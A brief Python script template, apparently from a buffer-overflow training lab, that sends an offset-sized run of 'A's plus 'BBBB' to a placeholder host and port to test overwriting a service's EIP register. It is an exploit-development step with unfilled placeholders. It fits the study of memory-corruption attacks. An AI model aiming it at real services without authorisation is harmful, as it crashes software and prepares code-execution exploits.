#!/usr/bin/python
#PROGRAM FOR FUZZING BUFFER OVERFLOWS
#YOU SHOULD HAVE IDENTIFIED A VULNERABLE PARAMETER BY NOW USING generic_send_tcp AND A SPIKE SCRIPT (spk)
import sys, socket
from time import sleep

#Setting buffer...SHOULD BE THE NUMBER DETERMINED BY THE PATTERN_OFFSET TOOL BEFORE
#THIS NUMBER WILL NEED TO BE CHANGED
buffer = 'A' * [CRASH VALUE]
#OVERWRITING EIP WITH B'S FOR TESTING
EIP = 'BBBB'

#Establishing socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#Connecting and sending your data
#CHANGE NEEDED BELOW
s.connect(('IP',PORT))
s.send(buffer + EIP + "\r\n")
s.recv(1024)
s.close()

#IF YOU SEE 42s on the EIP and 41s preceding it, congratulations, you just overwrote the EIP